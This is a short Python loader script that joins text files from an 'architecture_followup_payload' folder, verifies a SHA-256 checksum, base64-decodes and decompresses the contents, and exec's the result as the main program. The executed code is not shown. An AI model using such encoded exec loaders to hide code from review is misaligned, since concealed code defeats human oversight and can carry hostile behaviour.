from __future__ import annotations

import base64
import hashlib
import sys
import zlib
from pathlib import Path

PAYLOAD_SHA256 = "fb26b2639bc42a00c543471a1fd9745438a2283ada05a9435c5bee1059d53f38"
PAYLOAD_ROOT = Path(__file__).with_name("architecture_followup_payload")
payload = "".join(
    item.read_text(encoding="utf-8") for item in sorted(PAYLOAD_ROOT.glob("*.txt"))
)
if hashlib.sha256(payload.encode()).hexdigest() != PAYLOAD_SHA256:
    raise RuntimeError("architecture follow-up payload checksum mismatch")
code = zlib.decompress(base64.b64decode(payload))
namespace = {"__name__": "__main__", "__file__": __file__}
sys.argv = [__file__, *sys.argv[1:]]
exec(compile(code, __file__, "exec"), namespace)
